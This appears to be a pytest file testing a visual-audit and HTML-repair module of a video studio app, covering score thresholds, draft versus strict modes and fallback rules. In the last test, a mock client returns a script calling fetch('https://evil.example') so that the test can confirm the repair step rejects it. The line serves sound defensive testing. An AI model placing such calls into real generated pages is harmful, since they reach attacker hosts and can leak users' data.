import pytest

from app.studio.vision import CriterionScore, VisionDirector, VisionAudit


class FailingClient:
    class models:
        @staticmethod
        def generate_content(**_):
            raise RuntimeError("Vision provider unavailable")


async def test_vision_failure_retains_deterministic_motion():
    from pathlib import Path
    director = VisionDirector(FailingClient())
    result = await director.safe_audit(Path("unused.png"), "<script>window.seekTo=t=>t</script>")
    assert result.passed is False
    assert result.scores == []
    assert result.issues


def test_render_gate_rejects_low_or_missing_scores():
    import pytest
    from app.studio.vision import require_passing_audit

    with pytest.raises(RuntimeError, match="Visual audit did not pass"):
        require_passing_audit(VisionAudit(passed=False, issues=["overlap"], scores=[]))
    with pytest.raises(RuntimeError, match="Visual audit did not pass"):
        require_passing_audit(VisionAudit(passed=True, issues=[], scores=[]))


def test_render_gate_accepts_four_scores_of_eight_or_higher():
    from app.studio.vision import CriterionScore, require_passing_audit

    audit = VisionAudit(
        passed=True,
        issues=[],
        scores=[CriterionScore(criterion=name, score=8) for name in ("typography/contrast", "safe-zone compliance", "editorial craft", "visual momentum")],
    )
    require_passing_audit(audit)


def scored_audit(score: int) -> VisionAudit:
    names = ("typography/contrast", "safe-zone compliance", "editorial craft", "visual momentum")
    return VisionAudit(
        passed=score >= 8,
        issues=[],
        scores=[CriterionScore(criterion=name, score=score) for name in names],
    )


def test_draft_accepts_seven_with_ui_metadata_label():
    from app.studio.vision import require_passing_audit, review_label_for

    audit = scored_audit(7)
    require_passing_audit(audit, "draft")
    assert review_label_for(audit, "draft") == "Unreviewed draft"
    assert review_label_for(scored_audit(8), "draft") is None


def test_unaudited_render_is_draft_only():
    import pytest
    from app.studio.vision import require_unaudited_allowed, review_label_for

    require_unaudited_allowed("draft")
    assert review_label_for(None, "draft") == "Unreviewed draft"
    with pytest.raises(RuntimeError, match="AI visual review is required"):
        require_unaudited_allowed("strict")


def test_failed_audit_falls_back_to_unreviewed_draft_only_after_final_attempt():
    from app.studio.vision import should_use_unaudited_fallback

    assert should_use_unaudited_fallback("draft", 1) is True
    assert should_use_unaudited_fallback("draft", 0) is False
    assert should_use_unaudited_fallback("strict", 1) is False


class RepairClient:
    def __init__(self, text):
        self.text = text
        self.models = self

    def generate_content(self, **_):
        return type("Response", (), {"text": self.text})()


@pytest.mark.asyncio
async def test_repair_html_requires_sanitization_and_valid_clock(tmp_path):
    from app.studio.vision import VisionDirector

    (tmp_path / "contact.png").write_bytes(b"png")
    invalid = VisionDirector(RepairClient("<html><script>fetch('https://evil.example'); window.seekTo=t=>t;</script></html>"))
    with pytest.raises(ValueError):
        await invalid.repair(tmp_path / "contact.png", "html", scored_audit(7), tmp_path)

    valid = VisionDirector(RepairClient("<html><body><script>window.seekTo = t => document.body.dataset.time = t;</script></body></html>"))
    repaired = await valid.repair(tmp_path / "contact.png", "html", scored_audit(7), tmp_path)
    assert "window.seekTo" in repaired
